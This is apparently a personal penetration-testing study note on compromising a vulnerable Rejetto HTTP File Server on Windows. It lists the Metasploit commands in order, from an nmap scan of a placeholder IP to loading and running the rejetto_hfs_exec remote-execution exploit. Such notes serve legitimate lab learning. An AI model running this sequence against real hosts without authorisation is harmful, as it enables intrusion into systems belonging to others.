---
title: Vuln HTTP File Server
description: Notes on Vuln HTTP File Server.
date: '2026-10-26'
topics:
  - systems
section:
  - Systems
  - Window
  - Windows Exploits
order: 100
---
![](/notes/img/pasted-image-20251016233242.png)


```
workspace -s HFS
```

```
setg RHOSTS IP_ADDRESS
```

```
db_nmap -sS -sV -O IP_ADDRESS
```

```
search type:exploit name:rejetto
```

```
use exploit/windows/http/rejetto_hfs_exec
```

```
run
```

![](/notes/img/pasted-image-20251019140910.png)
